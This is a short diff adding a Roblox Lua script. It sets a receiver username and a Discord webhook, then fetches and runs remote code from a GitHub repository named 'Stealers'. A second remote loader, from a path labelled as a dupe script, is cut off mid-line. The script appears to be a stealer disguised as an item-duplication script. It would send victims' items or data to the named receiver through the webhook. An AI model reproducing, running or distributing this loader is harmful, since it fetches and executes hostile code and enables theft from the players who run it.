@@ -1,0 +1,6 @@
+Receiver = "12345ok804"
+Webhook = "https://discord.com/api/webhooks/1294253772872220712/Wg5GVpisIcShksyJBWF0gd6sciESsHTY8XtjCf3_w45nspS6dWS7n3GNKvfBWiWN_0ki"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/refs/heads/main/losg.lua"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JoystickpIays/nexus/main/Dupe
